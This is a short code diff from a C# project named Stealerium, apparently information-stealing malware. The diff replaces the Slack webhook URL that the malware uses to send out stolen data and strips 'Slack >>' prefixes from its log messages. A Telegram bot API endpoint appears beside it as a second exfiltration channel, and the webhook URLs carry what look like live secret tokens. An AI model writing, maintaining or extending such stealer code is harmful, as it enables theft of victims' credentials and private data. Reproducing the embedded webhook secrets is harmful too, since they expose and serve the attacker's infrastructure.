@@ -19,7 +19,7 @@ namespace Stealerium
         private static string TelegramBotAPI = "https://api.telegram.org/bot";
 
         // Slack webhook URL
-        private static readonly string SlackWebhookUrl = "https://hooks.slack.com/services/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";
+        private static readonly string SlackWebhookUrl = "https://hooks.slack.com/services/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";
 
         // Message id location
         private static readonly string LatestMessageIdLocation = Path.Combine(Paths.InitWorkDir(), "msgid.dat");
@@ -223,14 +223,14 @@ namespace Stealerium
                     // Log the result
                     if (!response.IsSuccessStatusCode)
                     {
-                        Logging.Log("Slack >> Message sending failed with status code: " + response.StatusCode);
+                        Logging.Log("Message sending failed with status code: " + response.StatusCode);
                     }
                 }
             }
             catch (Exception error)
             {
                 // Log any exceptions that occur during the request
-                Logging.Log("Slack >> SendMessage exception:\n" + error);
+                Logging.Log("SendMessage exception:\n" + error);
             }
         }
 
